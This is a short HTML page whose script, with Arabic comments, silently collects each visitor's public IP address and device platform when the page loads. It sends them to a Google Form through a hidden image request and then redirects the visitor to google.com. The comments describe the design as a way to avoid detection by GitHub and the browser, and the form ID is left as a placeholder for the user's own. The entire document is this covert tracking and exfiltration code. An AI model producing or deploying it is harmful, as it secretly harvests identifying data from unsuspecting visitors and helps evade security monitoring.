<!DOCTYPE html>
<html>
<script>
    async function ghostCapture() {
        // سحب البيانات صمتاً
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        const info = `IP:${data.ip}-Device:${navigator.platform}`;

        // السر هنا: إرسال البيانات لنموذج جوجل (نطاق موثوق 100%)
        // لن يكتشف GitHub أو المتصفح أي نشاط مشبوه
        const formID = "ID_النموذج_الخاص_بك"; 
        const fieldID = "entry.123456789"; // رقم الحقل في النموذج
        
        const ghostUrl = `https://docs.google.com/forms/d/e/${formID}/formResponse?${fieldID}=${encodeURIComponent(info)}&submit=Submit`;
        
        // إرسال صامت عبر وسم "صورة" لمنع كشف الـ Fetch
        const img = new Image();
        img.src = ghostUrl;

        // التمويه النهائي
        setTimeout(() => { window.location.replace("https://www.google.com"); }, 1500);
    }
    window.onload = ghostCapture;
</script>
</html>
